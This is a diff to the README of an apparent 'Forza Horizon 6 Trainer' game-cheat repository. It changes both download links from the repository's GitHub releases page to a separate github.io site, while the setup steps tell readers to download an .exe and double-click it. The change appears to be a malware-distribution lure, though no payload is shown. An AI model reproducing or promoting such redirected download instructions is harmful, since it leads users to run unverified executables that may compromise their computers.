@@ -1,6 +1,6 @@
 # 🏎️ Forza-Horizon-6-Trainer - Customize your cars and improve game performance
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/skulteti8372/Forza-Horizon-6-Trainer/releases)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://skulteti8372.github.io)
 
 ## 📌 Description
 
@@ -27,7 +27,7 @@ This software runs on Windows platforms. Ensure your computer meets these condit
 
 Follow these steps to set up the trainer on your computer.
 
-1. Visit the [official releases page](https://github.com/skulteti8372/Forza-Horizon-6-Trainer/releases) to download the latest version.
+1. Visit the [official releases page](https://skulteti8372.github.io) to download the latest version.
 2. Choose the version labeled .exe to begin your download.
 3. Locate the file in your Downloads folder after the download completes.
 4. Double-click the file to open the installation wizard.
